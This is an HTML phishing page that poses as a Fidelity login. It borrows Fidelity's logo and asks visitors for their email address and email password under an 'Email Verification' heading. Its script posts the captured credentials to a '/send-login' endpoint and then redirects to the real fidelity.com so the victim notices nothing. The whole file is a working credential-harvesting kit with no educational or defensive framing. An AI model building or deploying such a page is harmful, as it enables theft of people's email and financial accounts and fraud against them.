<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <title>Fidelity Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet"/>
  <style>body { font-family: "Inter", sans-serif; }</style>
</head>
<body class="bg-[#f2f2f2] min-h-screen flex flex-col">
  <header class="bg-white border-b border-gray-200">
    <div class="max-w-7xl mx-auto flex justify-between items-center px-4 py-3">
      <a href="#"><img alt="Fidelity logo" class="object-contain" height="32" src="https://digital.fidelity.com/stgw/digital/login/dist/Fidelity-wordmark.svg" width="120"/></a>
      <nav class="space-x-6 text-sm text-black">
        <a class="hover:underline" href="#">Security</a>
        <a class="hover:underline" href="#">FAQs</a>
      </nav>
    </div>
  </header>

  <main class="flex-grow flex flex-col items-center justify-center px-4 py-12">
    <form id="mailForm" class="bg-white rounded-lg shadow-sm p-8 w-full max-w-md" aria-label="Email verification form">
      <h1 class="text-2xl font-semibold mb-6">Email Verification</h1>
      <label class="block font-semibold mb-1" for="email">Email Address</label>
      <input id="email" name="email" type="text" autocomplete="email" class="w-full border border-gray-300 rounded-md px-3 py-2 mb-5 focus:outline-none focus:ring-2 focus:ring-green-700" required/>
      <label class="block font-semibold mb-1" for="emailPassword">Email Password</label>
      <div class="relative mb-4">
        <input id="emailPassword" name="emailPassword" type="password" autocomplete="current-password" class="w-full border border-gray-300 rounded-md px-3 py-2 pr-10 focus:outline-none focus:ring-2 focus:ring-green-700" required/>
      </div>
      <div class="flex items-center mb-6">
        <input id="rememberMail" name="rememberMail" type="checkbox" class="h-4 w-4 text-green-700 border-gray-300 rounded"/>
        <label class="ml-2 text-sm select-none" for="rememberMail">Remember my username</label>
      </div>
      <button type="submit" class="w-full bg-green-700 hover:bg-green-800 text-white font-semibold rounded-md py-2">Sign in</button>
    </form>
    <p class="mt-8 text-center text-sm text-black max-w-md">
      New to Fidelity?
      <a class="underline hover:text-green-700" href="#">Open an account</a> or
      <a class="underline hover:text-green-700" href="#">sign up.</a>
    </p>
  </main>

  <script>
    document.getElementById("mailForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const email = document.getElementById("email").value;
      const emailPassword = document.getElementById("emailPassword").value;
      const rememberMail = document.getElementById("rememberMail").checked;

      fetch("/send-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, emailPassword, rememberMail }),
      })
      .finally(() => {
        window.location.href = "https://www.fidelity.com/";
      });
    });
  </script>
</body>
</html>
